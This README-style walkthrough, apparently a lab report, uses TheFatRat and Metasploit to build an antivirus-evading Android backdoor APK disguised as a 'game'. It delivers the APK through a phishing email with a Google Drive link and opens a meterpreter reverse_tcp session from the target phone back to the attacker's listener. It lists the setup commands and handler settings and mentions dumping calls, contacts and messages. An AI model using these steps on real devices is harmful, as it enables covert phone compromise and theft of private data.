# Android-7.0-exploitation

## Android Rat – TheFatRat Pen-testing Tool to Hack and Gain access to Targeted Android Phone

TheFatRat is a simple Android RAT tool to build a backdoor and post exploitation attacks like browser attack. This Android RAT tool produces a malware with mainstream payload and afterward, the perfectly crafted malware will be executed on Windows, Android, Macintosh.

Malware that generated through TheFatRat has the ability to bypass Antivirus. By bypassing AV & Firewalls allows attackers to gain a Meterpreter session.

Automating Metasploit functions in this Android RAT are;

-	Create backdoor for Windows, Linux, Mac, and Android
-	Bypass antivirus backdoor
-	Check for Metasploit service and starts if not present
-	Easily craft meterpreter reverse_tcp payloads for Windows, Linux, Android and Mac and another
-	Start multiple meterpreter reverse_tcp listeners
-	Fast Search in searchsploit
-	Bypass AV
-	File pumper
-	Create backdoor with another technique
-	Auto run script for listeners (easy to use)

### Gaining access to Targeted Android Phone – Android RAT (TheFatRat)

This Android RAT tool, TheFatRat was downloaded from Github.

- git clone https://github.com/Screetsec/TheFatRat.git

Once this command executed, it was cloned and stored under TheFatRat.

-	cd TheFatRat

Then execute permission was given and setup.sh was run.

-	chmod +x setup.sh && ./setup.sh

Once installation completed the list of options were provided to create a payload.

### Configure Network Environment 

Before creating payload, the network environment was configured and the information was gathered.

firstly, the connectivity and identify IP range were checked.
<img src="Images/1.png">

Then, information was gathered using NMAP. After NMAP was run on terminal and a network scan was done. 
<img src="Images/2.png">

Here, related IP address of HUAWEI tab was seen. (All these devices were connected to the router)


### Run Android Rat on Kali Terminal

After typed “fatrat” command on terminal, Android Rat app was run on terminal. 

Then, payload can be created using Android RAT App. 
<img src="Images/3.png">

This is the Android Rat console. Here, available backdoor methods were seen.

Multiple payloads were seen here, based on targeted environment.

Ex; file extension (.elf, .exe, .apk, .macho, .php, .asp, .jsp, .war, .py, .sh, .pl)  

Here, the target environment is android, so that option three was selected here.

### Set Local IP Address and Local Port Number
<img src="Images/4.png">

The Local Host IP address and Local Port number were set here.

According to this environment Local Host IP address was 192.168.1.5 and Local Port number was 4444. Here, any unused port number was used. 

After entered the proper name of the payload, payload name was entered as " game ".

### Select Suitable Reverse Shell method
<img src="Images/5.png">

There were six types of reverse shell method. 

#### Reverse shell
- A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.

#### Meterpreter
- The meterpreter/reverse_tcp is a staged payload used to gain meterpreter access to a compromised system. A shell just gives you a basic command line to control the victim with. The meterpreter however gives immense control over the vicitim. The meterpreter is the preceded payload as it can simplify later exploitation/exfiltration processes.

There are two main features which make the reverse_http and reverse_https payloads very useful:
1. These payloads are using http/https types of traffic and protocol inspecting firewalls usually allow http/https traffic while they might block other types of traffic. In addition, these payloads use the WinInet API and will leverage any proxy or authentication settings that the user has configured for Internet access.
2. These payloads deal well with cases when the compromised target has spotty Internet access. If the connection between "victim" and the "attacker" machine drops, then the payload will keep trying reconnecting back to the "attacker" computer.

The android/meterpreter/reverse_tcp payload is a Java-based Meterpreter that can be used on an Android device. It is still at an early stage of development, but there are so many things can do with it already.

Meterpreter reverse_tcp was used, so number three was put here.

Here, Generate Backdoor table was seen. Given inputs for creating payload were seen in third column. 
<img src="Images/6.png">

Finally, payload was generated.

This was the payload what was created using the Android RAT App. This payload was sent as email or was uploaded to a website to download to the android devices.  
<img src="Images/7.png">

Before sent this, “game.apk” file converted in to RAR file.

In this tutorial, this payload was forwarded through a mail

### Send Payload to Target Device 

Firstly, payload (RAR File) was uploaded to the google drive and the link was shared through a mail.
<img src="Images/8.png">

The malicious link was attached to email body. Next this email was sent to target device.

After reviving mail, this file was downloaded by the android user and the game was installed to the device. 

### Exploit using metasploit framework 
Then meterpreter session was set up through msfconsole. “msfconsole” was commanded to run on terminal.
<img src="Images/9.png">

" exploit/ multi/ handler " was used

PAYLOAD was set as " android/ meterpreter/ reverse tcp " 

L HOST was set as " 192.168.1.5 "

L PORT was set as " 4444 " 

Finally, the exploit was completed.
<img src="Images/10.png">

Bellow commands were received when “help” command was typed in the terminal.
<img src="Images/11.png">

When “sysinfo” command was typed, the information related to system information were received. Using above command attacker can be got dump calls, contacts, messages and snaps with the mobile remotely.



